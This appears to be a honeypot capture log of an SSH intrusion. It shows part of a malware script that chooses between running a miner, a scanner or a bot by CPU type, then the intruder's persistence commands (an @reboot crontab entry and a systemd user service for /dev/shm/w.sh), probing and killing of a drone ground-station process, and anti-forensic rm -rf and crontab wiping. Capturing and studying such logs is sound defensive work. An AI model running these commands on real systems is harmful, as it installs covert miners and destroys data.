+# helper: stop if running
+stop_if_running() {
+  local bin="$1"
+  pgrep -f -- "$bin" >/dev/null 2>&1 || return 0
+  pkill -f -- "$bin" || true
+}
+
+# DECIZIE: miner-only vs scan+bot
+if [ "$arch" = "amd64" ]; then
+  if [ "$cores" -ge 4 ]; then
+    # miner only
+    [ -x "$MINER" ] || exit 0
+    start_bg "$MINER"
+    stop_if_running "$SCAN"
+    stop_if_running "$BOT"
+  else
+    # amd64 & <4 cores -> doar scan
+    if [ -x "$SCAN" ]; then
+      start_bg "$SCAN" $SCAN_ARGS
+    fi
+    stop_if_running "$MINER"
+    stop_if_running "$BOT"
+  fi
+else
+  # non-amd64 -> scan + bot
+  if [ -x "$SCAN" ]; then
+    start_bg "$SCAN" $SCAN_ARGS
+  fi
+  if [ -x "$BOT" ]; then
+    start_bg "$BOT"
+  fi
+  stop_if_running "$MINER"
+fi
+
+[2026-04-21 10:33:34.161099 UTC] [1776767614_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=start | message=forced-command entry
+
+[2026-04-21 10:33:34.211945 UTC] [1776767614_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_lock | status=ok | message=active session lock acquired
+
+[2026-04-21 10:33:34.235892 UTC] [1776767614_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=start | message=invoking root-session-client prepare
+
+[2026-04-21 10:33:36.530626 UTC] [1776767614_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=ok | message=prepare completed
+
+[2026-04-21 10:33:36.644384 UTC] [1776767614_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=ok | message=projection setup complete
+
+[2026-04-21 10:33:36.667873 UTC] [1776767614_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:mode_decision | status=ok | message=non_interactive_exec
+
+[2026-04-21 10:33:36.690879 UTC] [1776767614_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=exec-original-command path
+
+[2026-04-21 10:33:36.902224 UTC] [1776767614_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=start | message=daemon launch request
+
+[2026-04-21 10:33:36.902361 UTC] [1776767614_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=fail | message=tty_path= control_fd=none
+
+[2026-04-21 10:33:36.902439 UTC] [1776767614_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=ok | message=fallback=script-pty
+
+[2026-04-21 10:33:36.938247 UTC] [1776767614_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=launching chroot command
+
+[2026-04-21 10:33:37.000000 UTC] [1776767614_149.210.235.123_60696_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-21 10:33:37.000500 UTC] [1776767614_149.210.235.123_60696_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [
+    "dev/shm/w.sh",
+    "tmp/.ssh-shadow/session/commands.jsonl",
+    "tmp/.ssh-shadow/session/events.jsonl",
+    "tmp/.ssh-shadow/session/provenance.json"
+  ],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 4,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-21 10:33:37.203460 UTC] [1776767614_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=ok | message=chroot command exited cleanly | rc=0
+
+[2026-04-21 10:33:37.218231 UTC] [1776767614_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=ok | rc=0
+
+[2026-04-21 10:33:37.490818 UTC] [1776767614_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=start | message=invoking root-session-client cleanup
+
+[2026-04-21 10:33:37.548031 UTC] [1776767614_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=ok | message=cleanup completed
+
+[2026-04-21 10:33:37.606459 UTC] [1776767614_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_finalize | status=ok | message=normal_exit | rc=0
+
+[2026-04-21 10:33:38.000000 UTC] [1776767617_149.210.235.123_60696_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776767617_149.210.235.123_60696_sshshadow
+
+[2026-04-21 10:33:38.000010 UTC] [1776767617_149.210.235.123_60696_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=
+CRON="$(crontab -l 2>/dev/null || true)"
+echo "$CRON" | grep -F '/dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1 || \
+  printf '%s\n%s\n' "@reboot  /dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"" "0 * * * * cd "/dev/shm" && ./w.sh "astats" "netai" "kstats" "ssh 2 ranges"" | (cat -; echo "$CRON") | crontab -
+
+[2026-04-21 10:33:38.000020 UTC] [1776767617_149.210.235.123_60696_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-21 10:33:38.000100 UTC] [1776767617_149.210.235.123_60696_sshshadow] [exec_stdout]
+exec.stdout
+/bin/bash: line 4: crontab: command not found
+
+[2026-04-21 10:33:38.000200 UTC] [1776767617_149.210.235.123_60696_sshshadow] [exec_stderr]
+exec.stderr
+request failed
+
+[2026-04-21 10:33:38.007483 UTC] [1776767617_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=start | message=forced-command entry
+
+[2026-04-21 10:33:38.061043 UTC] [1776767617_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_lock | status=ok | message=active session lock acquired
+
+[2026-04-21 10:33:38.086225 UTC] [1776767617_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=start | message=invoking root-session-client prepare
+
+[2026-04-21 10:33:40.512662 UTC] [1776767617_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=ok | message=prepare completed
+
+[2026-04-21 10:33:40.626288 UTC] [1776767617_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=ok | message=projection setup complete
+
+[2026-04-21 10:33:40.650106 UTC] [1776767617_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:mode_decision | status=ok | message=non_interactive_exec
+
+[2026-04-21 10:33:40.674396 UTC] [1776767617_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=exec-original-command path
+
+[2026-04-21 10:33:40.911916 UTC] [1776767617_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=start | message=daemon launch request
+
+[2026-04-21 10:33:40.912046 UTC] [1776767617_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=fail | message=tty_path= control_fd=none
+
+[2026-04-21 10:33:40.912124 UTC] [1776767617_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=ok | message=fallback=script-pty
+
+[2026-04-21 10:33:40.948880 UTC] [1776767617_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=launching chroot command
+
+[2026-04-21 10:33:41.000000 UTC] [1776767617_149.210.235.123_60696_sshshadow] [session_end]
+session_end | reason=exit_code_127
+
+[2026-04-21 10:33:41.000000 UTC] [1776767621_149.210.235.123_60696_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776767621_149.210.235.123_60696_sshshadow
+
+[2026-04-21 10:33:41.000010 UTC] [1776767621_149.210.235.123_60696_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service'
+
+[2026-04-21 10:33:41.000020 UTC] [1776767621_149.210.235.123_60696_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-21 10:33:41.000100 UTC] [1776767621_149.210.235.123_60696_sshshadow] [exec_stdout]
+exec.stdout
+[Unit]
+Description=Watch netai via w.sh
+After=network-online.target
+
+[Service]
+Type=simple
+WorkingDirectory=/dev/shm
+ExecStart=/dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"
+Restart=always
+RestartSec=30
+
+[Install]
+WantedBy=default.target
+System has not been booted with systemd as init system.
+
+[2026-04-21 10:33:41.000200 UTC] [1776767621_149.210.235.123_60696_sshshadow] [exec_stderr]
+exec.stderr
+request failed
+
+[2026-04-21 10:33:41.000400 UTC] [1776767617_149.210.235.123_60696_sshshadow] [chroot_launch.stderr]
+chroot_launch.stderr
+/bin/bash: line 4: crontab: command not found
+
+[2026-04-21 10:33:41.000500 UTC] [1776767617_149.210.235.123_60696_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [
+    "tmp/.ssh-shadow/session/commands.jsonl",
+    "tmp/.ssh-shadow/session/events.jsonl",
+    "tmp/.ssh-shadow/session/provenance.json"
+  ],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 3,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-21 10:33:41.007925 UTC] [1776767617_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=fail | rc=127
+
+[2026-04-21 10:33:41.324277 UTC] [1776767617_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=start | message=invoking root-session-client cleanup
+
+[2026-04-21 10:33:41.381674 UTC] [1776767617_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=ok | message=cleanup completed
+
+[2026-04-21 10:33:41.439166 UTC] [1776767617_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_finalize | status=ok | message=exit_code_127 | rc=127
+
+[2026-04-21 10:33:41.718274 UTC] [1776767621_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=start | message=forced-command entry
+
+[2026-04-21 10:33:41.769049 UTC] [1776767621_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_lock | status=ok | message=active session lock acquired
+
+[2026-04-21 10:33:41.792817 UTC] [1776767621_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=start | message=invoking root-session-client prepare
+
+[2026-04-21 10:33:44.100377 UTC] [1776767621_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=ok | message=prepare completed
+
+[2026-04-21 10:33:44.223116 UTC] [1776767621_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=ok | message=projection setup complete
+
+[2026-04-21 10:33:44.249047 UTC] [1776767621_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:mode_decision | status=ok | message=non_interactive_exec
+
+[2026-04-21 10:33:44.274158 UTC] [1776767621_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=exec-original-command path
+
+[2026-04-21 10:33:44.486034 UTC] [1776767621_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=start | message=daemon launch request
+
+[2026-04-21 10:33:44.486215 UTC] [1776767621_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=fail | message=tty_path= control_fd=none
+
+[2026-04-21 10:33:44.486300 UTC] [1776767621_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=ok | message=fallback=script-pty
+
+[2026-04-21 10:33:44.523642 UTC] [1776767621_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=launching chroot command
+
+[2026-04-21 10:33:44.769822 UTC] [1776767621_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=fail | rc=1
+
+[2026-04-21 10:33:45.000000 UTC] [1776767621_149.210.235.123_60696_sshshadow] [session_end]
+session_end | reason=exit_code_1
+
+[2026-04-21 10:33:45.000000 UTC] [1776767625_149.210.235.123_60696_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776767625_149.210.235.123_60696_sshshadow
+
+[2026-04-21 10:33:45.000010 UTC] [1776767625_149.210.235.123_60696_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10
+
+[2026-04-21 10:33:45.000020 UTC] [1776767625_149.210.235.123_60696_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-21 10:33:45.000100 UTC] [1776767625_149.210.235.123_60696_sshshadow] [exec_stdout]
+exec.stdout
+Error, do this: mount -t proc proc /proc
+gcs      4242  1.2  3.7 335544 145000 ?        Sl   10:00   0:21 QGroundControl --appimage
+gcs      4243  0.6  0.8  77224  32144 ?        Sl   10:00   0:09 mavproxy.py --master=tcp:127.0.0.1:5760
+
+[2026-04-21 10:33:45.000400 UTC] [1776767621_149.210.235.123_60696_sshshadow] [chroot_launch.stderr]
+chroot_launch.stderr
+System has not been booted with systemd as init system.
+
+[2026-04-21 10:33:45.000500 UTC] [1776767621_149.210.235.123_60696_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [
+    "tmp/.ssh-shadow/session/commands.jsonl",
+    "tmp/.ssh-shadow/session/events.jsonl",
+    "tmp/.ssh-shadow/session/provenance.json"
+  ],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 3,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-21 10:33:45.002509 UTC] [1776767621_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=start | message=invoking root-session-client cleanup
+
+[2026-04-21 10:33:45.068473 UTC] [1776767621_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=ok | message=cleanup completed
+
+[2026-04-21 10:33:45.161813 UTC] [1776767621_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_finalize | status=ok | message=exit_code_1 | rc=1
+
+[2026-04-21 10:33:45.426579 UTC] [1776767625_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=start | message=forced-command entry
+
+[2026-04-21 10:33:45.476172 UTC] [1776767625_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_lock | status=ok | message=active session lock acquired
+
+[2026-04-21 10:33:45.499348 UTC] [1776767625_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=start | message=invoking root-session-client prepare
+
+[2026-04-21 10:33:47.479340 UTC] [1776767625_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=ok | message=prepare completed
+
+[2026-04-21 10:33:47.589839 UTC] [1776767625_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=ok | message=projection setup complete
+
+[2026-04-21 10:33:47.614425 UTC] [1776767625_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:mode_decision | status=ok | message=non_interactive_exec
+
+[2026-04-21 10:33:47.638789 UTC] [1776767625_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=exec-original-command path
+
+[2026-04-21 10:33:47.846024 UTC] [1776767625_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=start | message=daemon launch request
+
+[2026-04-21 10:33:47.846199 UTC] [1776767625_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=fail | message=tty_path= control_fd=none
+
+[2026-04-21 10:33:47.846283 UTC] [1776767625_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=ok | message=fallback=script-pty
+
+[2026-04-21 10:33:47.884188 UTC] [1776767625_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=launching chroot command
+
+[2026-04-21 10:33:48.000000 UTC] [1776767625_149.210.235.123_60696_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-21 10:33:48.000000 UTC] [1776767628_149.210.235.123_60696_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776767628_149.210.235.123_60696_sshshadow
+
+[2026-04-21 10:33:48.000010 UTC] [1776767628_149.210.235.123_60696_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=readlink -f /proc/gcs/exe
+
+[2026-04-21 10:33:48.000020 UTC] [1776767628_149.210.235.123_60696_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-21 10:33:48.000100 UTC] [1776767628_149.210.235.123_60696_sshshadow] [exec_stdout]
+exec.stdout
+/bin/bash: line 1: readlink: command not found
+
+[2026-04-21 10:33:48.000200 UTC] [1776767628_149.210.235.123_60696_sshshadow] [exec_stderr]
+exec.stderr
+request failed
+
+[2026-04-21 10:33:48.000400 UTC] [1776767625_149.210.235.123_60696_sshshadow] [chroot_launch.stderr]
+chroot_launch.stderr
+Error, do this: mount -t proc proc /proc
+
+[2026-04-21 10:33:48.000500 UTC] [1776767625_149.210.235.123_60696_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [
+    "tmp/.ssh-shadow/session/commands.jsonl",
+    "tmp/.ssh-shadow/session/events.jsonl",
+    "tmp/.ssh-shadow/session/provenance.json"
+  ],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 3,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-21 10:33:48.134937 UTC] [1776767625_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=ok | message=chroot command exited cleanly | rc=0
+
+[2026-04-21 10:33:48.149919 UTC] [1776767625_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=ok | rc=0
+
+[2026-04-21 10:33:48.390830 UTC] [1776767625_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=start | message=invoking root-session-client cleanup
+
+[2026-04-21 10:33:48.448663 UTC] [1776767625_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=ok | message=cleanup completed
+
+[2026-04-21 10:33:48.499824 UTC] [1776767625_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_finalize | status=ok | message=normal_exit | rc=0
+
+[2026-04-21 10:33:48.757502 UTC] [1776767628_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=start | message=forced-command entry
+
+[2026-04-21 10:33:48.832826 UTC] [1776767628_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_lock | status=ok | message=active session lock acquired
+
+[2026-04-21 10:33:48.856896 UTC] [1776767628_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=start | message=invoking root-session-client prepare
+
+[2026-04-21 10:33:50.958781 UTC] [1776767628_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=ok | message=prepare completed
+
+[2026-04-21 10:33:51.000000 UTC] [1776767628_149.210.235.123_60696_sshshadow] [session_end]
+session_end | reason=exit_code_127
+
+[2026-04-21 10:33:51.000400 UTC] [1776767628_149.210.235.123_60696_sshshadow] [chroot_launch.stderr]
+chroot_launch.stderr
+/bin/bash: line 1: readlink: command not found
+
+[2026-04-21 10:33:51.000500 UTC] [1776767628_149.210.235.123_60696_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [
+    "tmp/.ssh-shadow/session/commands.jsonl",
+    "tmp/.ssh-shadow/session/events.jsonl",
+    "tmp/.ssh-shadow/session/provenance.json"
+  ],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 3,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-21 10:33:51.083596 UTC] [1776767628_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=ok | message=projection setup complete
+
+[2026-04-21 10:33:51.109188 UTC] [1776767628_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:mode_decision | status=ok | message=non_interactive_exec
+
+[2026-04-21 10:33:51.133374 UTC] [1776767628_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=exec-original-command path
+
+[2026-04-21 10:33:51.335304 UTC] [1776767628_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=start | message=daemon launch request
+
+[2026-04-21 10:33:51.335435 UTC] [1776767628_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=fail | message=tty_path= control_fd=none
+
+[2026-04-21 10:33:51.335510 UTC] [1776767628_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=ok | message=fallback=script-pty
+
+[2026-04-21 10:33:51.372466 UTC] [1776767628_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=launching chroot command
+
+[2026-04-21 10:33:51.431319 UTC] [1776767628_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=fail | rc=127
+
+[2026-04-21 10:33:51.669248 UTC] [1776767628_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=start | message=invoking root-session-client cleanup
+
+[2026-04-21 10:33:51.727458 UTC] [1776767628_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=ok | message=cleanup completed
+
+[2026-04-21 10:33:51.778057 UTC] [1776767628_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_finalize | status=ok | message=exit_code_127 | rc=127
+
+[2026-04-21 10:33:52.000000 UTC] [1776767632_149.210.235.123_60696_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776767632_149.210.235.123_60696_sshshadow
+
+[2026-04-21 10:33:52.000010 UTC] [1776767632_149.210.235.123_60696_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=
+        kill -9 $(lsof +D . 2>/dev/null | awk '{print $2}' | sort -u);
+        rm -rf .;
+        crontab -l 2>/dev/null | grep -v . | crontab -
+
+[2026-04-21 10:33:52.000020 UTC] [1776767632_149.210.235.123_60696_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-21 10:33:52.000100 UTC] [1776767632_149.210.235.123_60696_sshshadow] [exec_stdout]
+exec.stdout
+/bin/bash: line 2: sort: command not found
+kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | jobspec ... or kill -l [sigspec]
+/bin/rm: refusing to remove '.' or '..' directory: skipping '.'
+/bin/bash: line 4: grep: command not found
+/bin/bash: line 4: crontab: command not found
+
+[2026-04-21 10:33:52.000200 UTC] [1776767632_149.210.235.123_60696_sshshadow] [exec_stderr]
+exec.stderr
+request failed
+
+[2026-04-21 10:33:52.045701 UTC] [1776767632_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=start | message=forced-command entry
+
+[2026-04-21 10:33:52.099937 UTC] [1776767632_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_lock | status=ok | message=active session lock acquired
+
+[2026-04-21 10:33:52.129035 UTC] [1776767632_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=start | message=invoking root-session-client prepare
+
+[2026-04-21 10:33:53.997280 UTC] [1776767632_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=ok | message=prepare completed
+
+[2026-04-21 10:33:54.000000 UTC] [1776767632_149.210.235.123_60696_sshshadow] [session_end]
+session_end | reason=exit_code_127
+
+[2026-04-21 10:33:54.000400 UTC] [1776767632_149.210.235.123_60696_sshshadow] [chroot_launch.stderr]
+chroot_launch.stderr
+/bin/bash: line 2: sort: command not found
+kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | jobspec ... or kill -l [sigspec]
+/bin/rm: refusing to remove '.' or '..' directory: skipping '.'
+/bin/bash: line 4: grep: command not found
+/bin/bash: line 4: crontab: command not found
+
+[2026-04-21 10:33:54.000500 UTC] [1776767632_149.210.235.123_60696_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [
+    "tmp/.ssh-shadow/session/commands.jsonl",
+    "tmp/.ssh-shadow/session/events.jsonl",
+    "tmp/.ssh-shadow/session/provenance.json"
+  ],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 3,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-21 10:33:54.117118 UTC] [1776767632_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=ok | message=projection setup complete
+
+[2026-04-21 10:33:54.166563 UTC] [1776767632_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:mode_decision | status=ok | message=non_interactive_exec
+
+[2026-04-21 10:33:54.190922 UTC] [1776767632_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=exec-original-command path
+
+[2026-04-21 10:33:54.398123 UTC] [1776767632_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=start | message=daemon launch request
+
+[2026-04-21 10:33:54.398301 UTC] [1776767632_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=fail | message=tty_path= control_fd=none
+
+[2026-04-21 10:33:54.398383 UTC] [1776767632_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=ok | message=fallback=script-pty
+
+[2026-04-21 10:33:54.435044 UTC] [1776767632_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=launching chroot command
+
+[2026-04-21 10:33:54.462902 UTC] [1776767632_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=fail | rc=127
+
+[2026-04-21 10:33:54.718117 UTC] [1776767632_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=start | message=invoking root-session-client cleanup
+
+[2026-04-21 10:33:54.776003 UTC] [1776767632_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=ok | message=cleanup completed
+
+[2026-04-21 10:33:54.824460 UTC] [1776767632_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_finalize | status=ok | message=exit_code_127 | rc=127
+
+[2026-04-21 10:33:55.000000 UTC] [1776767635_149.210.235.123_60696_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776767635_149.210.235.123_60696_sshshadow
+
+[2026-04-21 10:33:55.000010 UTC] [1776767635_149.210.235.123_60696_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=kill -9 gcs
+
+[2026-04-21 10:33:55.000020 UTC] [1776767635_149.210.235.123_60696_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-21 10:33:55.000100 UTC] [1776767635_149.210.235.123_60696_sshshadow] [exec_stdout]
+exec.stdout
+/bin/bash: line 1: kill: gcs: arguments must be process or job IDs
+
+[2026-04-21 10:33:55.000200 UTC] [1776767635_149.210.235.123_60696_sshshadow] [exec_stderr]
+exec.stderr
+request failed
+
+[2026-04-21 10:33:55.087226 UTC] [1776767635_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=start | message=forced-command entry
+
+[2026-04-21 10:33:55.142370 UTC] [1776767635_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_lock | status=ok | message=active session lock acquired
+
+[2026-04-21 10:33:55.166328 UTC] [1776767635_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=start | message=invoking root-session-client prepare
+
+[2026-04-21 10:33:57.356275 UTC] [1776767635_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=ok | message=prepare completed
+
+[2026-04-21 10:33:57.466350 UTC] [1776767635_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=ok | message=projection setup complete
+
+[2026-04-21 10:33:57.489620 UTC] [1776767635_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:mode_decision | status=ok | message=non_interactive_exec
+
+[2026-04-21 10:33:57.513100 UTC] [1776767635_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=exec-original-command path
+
+[2026-04-21 10:33:57.713662 UTC] [1776767635_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=start | message=daemon launch request
+
+[2026-04-21 10:33:57.713863 UTC] [1776767635_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=fail | message=tty_path= control_fd=none
+
+[2026-04-21 10:33:57.713971 UTC] [1776767635_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=ok | message=fallback=script-pty
+
+[2026-04-21 10:33:57.784348 UTC] [1776767635_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=launching chroot command
+
+[2026-04-21 10:33:57.803696 UTC] [1776767635_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=fail | rc=1
+
+[2026-04-21 10:33:58.000000 UTC] [1776767635_149.210.235.123_60696_sshshadow] [session_end]
+session_end | reason=exit_code_1
+
+[2026-04-21 10:33:58.000000 UTC] [1776767638_149.210.235.123_60696_sshshadow] [session_start]
